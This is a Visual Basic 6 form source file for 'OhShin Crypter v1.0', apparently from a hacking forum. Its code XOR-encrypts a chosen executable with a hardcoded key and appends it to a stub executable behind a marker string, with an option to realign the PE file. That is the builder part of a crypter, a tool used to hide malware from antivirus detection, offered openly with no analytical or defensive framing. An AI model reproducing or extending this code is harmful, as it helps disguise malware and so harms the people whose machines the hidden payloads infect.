VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{BD0C1912-66C3-49CC-8B12-7B347BF6C846}#12.1#0"; "CO248E~1.OCX"
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#12.1#0"; "CODEJO~3.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmMain 
   BackColor       =   &H00000000&
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "..::|OhShin Crypter v1.0|::.."
   ClientHeight    =   2670
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   3600
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "frmMain.frx":0000
   ScaleHeight     =   2670
   ScaleWidth      =   3600
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CheckBox chkEOF 
      BackColor       =   &H80000012&
      Caption         =   "EOF"
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   1440
      TabIndex        =   6
      Top             =   1680
      Width           =   735
   End
   Begin MSComctlLib.StatusBar StatusBar1 
      Align           =   2  'Align Bottom
      Height          =   255
      Left            =   0
      TabIndex        =   5
      Top             =   2415
      Width           =   3600
      _ExtentX        =   6350
      _ExtentY        =   450
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   2
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Object.Width           =   4234
            MinWidth        =   4234
            Text            =   "Registered To: HF 1337"
            TextSave        =   "Registered To: HF 1337"
         EndProperty
         BeginProperty Panel2 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Style           =   5
            TextSave        =   "2:28 PM"
         EndProperty
      EndProperty
   End
   Begin VB.CheckBox chk_realign 
      BackColor       =   &H00000000&
      Caption         =   "Realign PE"
      ForeColor       =   &H00FF0000&
      Height          =   255
      Left            =   240
      TabIndex        =   4
      Top             =   1680
      Width           =   1095
   End
   Begin XtremeSkinFramework.SkinFramework sfSkins 
      Left            =   2880
      Top             =   240
      _Version        =   786433
      _ExtentX        =   635
      _ExtentY        =   635
      _StockProps     =   0
   End
   Begin XtremeSuiteControls.PushButton cmdAbout 
      Height          =   375
      Left            =   0
      TabIndex        =   2
      Top             =   2040
      Width           =   1815
      _Version        =   786433
      _ExtentX        =   3201
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "About"
      BackColor       =   -2147483633
      Appearance      =   6
   End
   Begin MSComDlg.CommonDialog CD 
      Left            =   2760
      Top             =   240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin XtremeSuiteControls.FlatEdit txtfile 
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   1320
      Width           =   2655
      _Version        =   786433
      _ExtentX        =   4683
      _ExtentY        =   450
      _StockProps     =   77
      BackColor       =   -2147483643
      Locked          =   -1  'True
      Appearance      =   6
      UseVisualStyle  =   0   'False
   End
   Begin XtremeSuiteControls.PushButton cmdSearch 
      Height          =   255
      Left            =   2880
      TabIndex        =   0
      Top             =   1320
      Width           =   615
      _Version        =   786433
      _ExtentX        =   1085
      _ExtentY        =   450
      _StockProps     =   79
      Caption         =   ". . ."
      BackColor       =   -2147483633
      Appearance      =   6
   End
   Begin XtremeSuiteControls.PushButton cmdProtect 
      Height          =   375
      Left            =   1800
      TabIndex        =   1
      Top             =   2040
      Width           =   1815
      _Version        =   786433
      _ExtentX        =   3201
      _ExtentY        =   661
      _StockProps     =   79
      Caption         =   "Crypt"
      BackColor       =   -2147483633
      Appearance      =   6
   End
   Begin VB.Image Image1 
      Height          =   1050
      Left            =   -120
      Picture         =   "frmMain.frx":7152
      Top             =   0
      Width           =   3750
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Check2_Click()
If Check2.Value = 1 Then
frmIcon.Show
End If

End Sub



Private Sub cmdAbout_Click()
frmAbout.Show
End Sub

Private Sub cmdProtect_Click()

Dim Stub As String
Dim File As String

Open App.Path & "\Stub.exe" For Binary As #1
Stub = Space(LOF(1))
Get #1, , Stub
Close #1

With CD
.DialogTitle = "Select Where you want to Save Crypted File"
.Filter = "EXE Files |*.exe"
.ShowSave
End With

Open txtfile.Text For Binary As #1

File = Space(LOF(1))
Get #1, , File
Close #1

File = Encrypt(File, "AD8TGYSS5N66UCG8162U3G")

Open CD.FileName For Binary As #1

Put #1, , Stub & "56XTCF8AQ2U3F11NU681J5" & File
Close #1

If chk_realign.Value = 1 Then
Call RealignPEFromFile(CD.FileName)

MsgBox "File Crypted!", vbInformation
End If

End Sub

Private Sub cmdSearch_Click()
With CD
.DialogTitle = "Select The file you Want to Protect"
.Filter = "EXE Files |*.exe"
.ShowOpen
End With

If Not CD.FileName = vbNullString Then
txtfile.Text = CD.FileName

End If
End Sub

Public Function Encrypt(sText As String, sKey As String) As String
Dim i, x, y As Integer, b() As Byte, k() As Byte

Encrypt = vbNullString
x = 0
b() = StrConv(sText, vbFromUnicode)
k() = StrConv(sKey, vbFromUnicode)
For i = 0 To Len(sText) - 1
    If x = Len(sKey) - 1 Then
        x = 0
    Else
        x = x + 1
    End If
   
    For y = 1 To 255
        b(i) = b(i) Xor k(x) Mod (y + 5)
    Next y
Next i
Encrypt = StrConv(b, vbUnicode)
End Function



Private Sub Form_Load()
    With sfSkins
        .LoadSkin App.Path & "\Skins\Vista.cjstyles", "NormalBlack2.ini"
        .ApplyWindow Me.hWnd
    End With
End Sub
